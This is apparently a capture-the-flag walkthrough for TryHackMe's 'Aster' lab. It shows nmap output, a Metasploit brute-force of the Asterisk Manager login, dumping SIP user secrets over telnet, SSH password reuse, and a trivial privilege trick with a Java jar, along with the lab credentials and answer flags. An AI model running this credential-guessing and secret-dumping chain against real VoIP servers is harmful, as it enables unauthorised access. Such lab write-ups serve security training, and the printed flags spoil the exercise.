# Aster

Hack my server dedicated for building communications applications.

[Aster](https://tryhackme.com/room/aster)

## Topic's

- Network Enumeration
- Reverse Engineering (Python)
- Metasploit (asterisk_login)
- Asterisk Call Manager
- Reverse Engineering (Java)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Flags

Are you able to complete the challenge?
The machine may take up to 3 minutes to boot and configure

```
kali@kali:~/CTFs/tryhackme/Aster$ sudo nmap -A -v -p- -T4 10.10.165.247
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 17:58 CEST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
Initiating Ping Scan at 17:58
Scanning 10.10.165.247 [4 ports]
Completed Ping Scan at 17:58, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:58
Completed Parallel DNS resolution of 1 host. at 17:58, 0.00s elapsed
Initiating SYN Stealth Scan at 17:58
Scanning 10.10.165.247 [65535 ports]
Discovered open port 80/tcp on 10.10.165.247
Discovered open port 1720/tcp on 10.10.165.247
Discovered open port 22/tcp on 10.10.165.247
Discovered open port 5038/tcp on 10.10.165.247
Discovered open port 2000/tcp on 10.10.165.247
Completed SYN Stealth Scan at 17:58, 34.44s elapsed (65535 total ports)
Initiating Service scan at 17:58
Scanning 5 services on 10.10.165.247
Completed Service scan at 17:59, 23.43s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 10.10.165.247
Retrying OS detection (try #2) against 10.10.165.247
Retrying OS detection (try #3) against 10.10.165.247
Retrying OS detection (try #4) against 10.10.165.247
Retrying OS detection (try #5) against 10.10.165.247
Initiating Traceroute at 17:59
Completed Traceroute at 17:59, 0.04s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 17:59
Completed Parallel DNS resolution of 2 hosts. at 17:59, 0.00s elapsed
NSE: Script scanning 10.10.165.247.
Initiating NSE at 17:59
Completed NSE at 17:59, 14.46s elapsed
Initiating NSE at 17:59
Completed NSE at 17:59, 0.23s elapsed
Initiating NSE at 17:59
Completed NSE at 17:59, 0.01s elapsed
Nmap scan report for 10.10.165.247
Host is up (0.040s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA)
|   256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA)
|_  256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Aster CTF
1720/tcp open  h323q931?
2000/tcp open  cisco-sccp?
5038/tcp open  asterisk    Asterisk Call Manager 5.0.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/24%OT=22%CT=1%CU=35784%PV=Y%DS=2%DC=T%G=Y%TM=5F944F
OS:6E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 0.031 days (since Sat Oct 24 17:14:24 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   39.67 ms 10.8.0.1
2   39.80 ms 10.10.165.247

NSE: Script Post-scanning.
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.26 seconds
           Raw packets sent: 66011 (2.909MB) | Rcvd: 65617 (2.628MB)
```

[http://10.10.165.247/](http://10.10.165.247/)

```
kali@kali:~/CTFs/tryhackme/Aster$ uncompyle6 output.pyc
```

```py
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41)
# [GCC 9.3.0]
# Embedded file name: ./output.py
# Compiled at: 2020-08-11 08:59:35
import pyfiglet
o0OO00 = pyfiglet.figlet_format('Hello!!')
oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
OOOo0 = bytes.fromhex(oO00oOo)
Oooo000o = OOOo0.decode('ASCII')
if 0:
    i1 * ii1IiI1i % OOooOOo / I11i / o0O / IiiIII111iI
Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
I1Ii11I1Ii1i = bytes.fromhex(Oo)
Ooo = I1Ii11I1Ii1i.decode('ASCII')
if 0:
    iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II
print(o0OO00)
# okay decompiling output.pyc
```

```
kali@kali:~/CTFs/tryhackme/Aster$ python3 ./output.py
Good job, user "admin" the open source framework for building communications, installed in the server.
Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
 _   _      _ _       _ _
| | | | ___| | | ___ | | |
| |_| |/ _ \ | |/ _ \| | |
|  _  |  __/ | | (_) |_|_|
|_| |_|\___|_|_|\___/(_|_)
```

```
kali@kali:~/CTFs/tryhackme/Aster$ msfconsole -q
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/voip/asterisk_login
msf5 auxiliary(voip/asterisk_login) > options

Module options (auxiliary/voip/asterisk_login):

   Name              Current Setting                                                    Required  Description
   ----              ---------------                                                    --------  -----------
   BLANK_PASSWORDS   false                                                              no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                  yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                              no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                              no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                              no        Add all users in the current database to the list
   PASSWORD                                                                             no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        The file that contains a list of probable passwords.
   RHOSTS                                                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             5038                                                               yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                                              yes       Stop guessing when a credential works for a host
   THREADS           1                                                                  yes       The number of concurrent threads (max one per host)
   USERNAME                                                                             no        A specific username to authenticate as
   USERPASS_FILE                                                                        no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                              no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/unix_users.txt      no        The file that contains a list of probable users accounts.
   VERBOSE           true                                                               yes       Whether to print output for all attempts

msf5 auxiliary(voip/asterisk_login) > set username admin
username => admin
msf5 auxiliary(voip/asterisk_login) > set rhosts 10.10.165.247
rhosts => 10.10.165.247
msf5 auxiliary(voip/asterisk_login) > run

[*] 10.10.165.247:5038    - Initializing module...
[+] 10.10.165.247:5038    - User: "admin" using pass: "" - can login on 10.10.165.247:5038!
^C[*] 10.10.165.247:5038    - Caught interrupt from the console...
[*] Auxiliary module execution completed
msf5 auxiliary(voip/asterisk_login) >
```

`abc123`

[https://www.voip-info.org/asterisk-manager-example-login/](https://www.voip-info.org/asterisk-manager-example-login/)

```
kali@kali:~/CTFs/tryhackme/Aster$ telnet 10.10.165.247 5038
Trying 10.10.165.247...
Connected to 10.10.165.247.
Escape character is '^]'.
Asterisk Call Manager/5.0.2
Action: Login
Username: admin
Secret: abc123

Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Uptime: 4731
LastReload: 4731
Status: Fully Booted

Action: command
Command:  sip show users

Response: Success
Message: Command output follows
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No
Output: 101                        101                               test             No   No
Output: harry                      p4ss#w0rd!#                       test             No   No
```

`harry:p4ss#w0rd!#`

```
kali@kali:~/CTFs/tryhackme/Aster$ ssh harry@10.10.165.247
The authenticity of host '10.10.165.247 (10.10.165.247)' can't be established.
ECDSA key fingerprint is SHA256:uYoqUlSuCJNRjK1VYSgTnlOma6s8oDJ15UmcifsD6nw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.165.247' (ECDSA) to the list of known hosts.
harry@10.10.165.247's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Wed Aug 12 14:25:25 2020 from 192.168.85.1
harry@ubuntu:~$ ls
Example_Root.jar  user.txt
harry@ubuntu:~$ cat user.txt
thm{bas1c_aster1ck_explotat1on}
```

```
harry@ubuntu:~$ scp Example_Root.jar kali@10.8.106.222:/home/kali/CTFs/tryhackme/Aster
The authenticity of host '10.8.106.222 (10.8.106.222)' can't be established.
ECDSA key fingerprint is SHA256:xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG+Y.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.8.106.222' (ECDSA) to the list of known hosts.
kali@10.8.106.222's password:
Example_Root.jar           100% 1094     1.1KB/s   00:00
harry@ubuntu:~$
```

```java
import java.io.IOException;
import java.io.FileWriter;
import java.io.File;

//
// Decompiled by Procyon v0.5.36
//

public class Example_Root
{
    public static boolean isFileExists(final File file) {
        return file.isFile();
    }

    public static void main(final String[] array) {
        final File file = new File("/tmp/flag.dat");
        try {
            if (isFileExists(file)) {
                final FileWriter fileWriter = new FileWriter("/home/harry/root.txt");
                fileWriter.write("my secret <3 baby");
                fileWriter.close();
                System.out.println("Successfully wrote to the file.");
            }
        }
        catch (IOException ex) {
            System.out.println("An error occurred.");
            ex.printStackTrace();
        }
    }
}
```

```
harry@ubuntu:~$ touch /tmp/flag.dat
harry@ubuntu:~$ ls
Example_Root.jar  root.txt  user.txt
harry@ubuntu:~$ cat root.txt
thm{fa1l_revers1ng_java}
```

1. Compromise the machine and locate user.txt

`thm{bas1c_aster1ck_explotat1on}`

2. Reverse file and get root.txt

`thm{fa1l_revers1ng_java}`
